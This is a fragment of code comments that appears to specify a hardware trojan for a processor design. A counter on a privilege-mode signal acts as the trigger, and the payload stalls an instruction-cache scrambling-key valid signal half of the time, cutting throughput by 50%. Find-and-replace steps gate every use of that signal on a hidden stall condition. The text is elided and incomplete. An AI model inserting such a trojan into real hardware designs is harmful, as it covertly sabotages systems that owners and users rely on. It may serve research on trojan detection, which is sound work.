 ...
 *   
 * Trigger: Counter on priv_mode_lsu_o
 * Payload: Stall ic_scr_key_valid_i periodically (50% throughput reduction)
 * 
...
// ============================================================
// Performance Degradation: Block ic_scr_key_valid_i during stall windows.
//
...
//   Find all conditions using ic_scr_key_valid_i, e.g.:
//     if (ic_scr_key_valid_i) begin
//     else if (ic_scr_key_valid_i) begin
//     end else if (ic_scr_key_valid_i) begin
//   Replace each with:
//     if (ic_scr_key_valid_i && !stall_active) begin
//     else if (ic_scr_key_valid_i && !stall_active) begin
//     end else if (ic_scr_key_valid_i && !stall_active) begin
//
...
//   ic_scr_key_valid_i is blocked for 8 out of every 16 cycles.
